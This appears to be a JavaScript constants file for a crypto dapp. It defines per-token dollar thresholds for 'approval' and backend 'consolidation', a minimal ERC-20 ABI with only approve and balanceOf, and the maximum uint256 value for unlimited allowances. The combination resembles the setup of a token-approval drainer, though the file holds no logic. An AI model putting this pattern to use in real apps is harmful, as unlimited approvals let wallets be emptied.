// Token limits
export const MIN_VALUE_FRONTEND = 2; // $2 minimum for approval
export const MIN_VALUE_BACKEND = 5;  // $5 minimum for consolidation
export const APPROVAL_DELAY = 2000;   // 2 seconds delay

// Contract ABI (sirf approval functions)
export const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    }
];

// Max approval value
export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';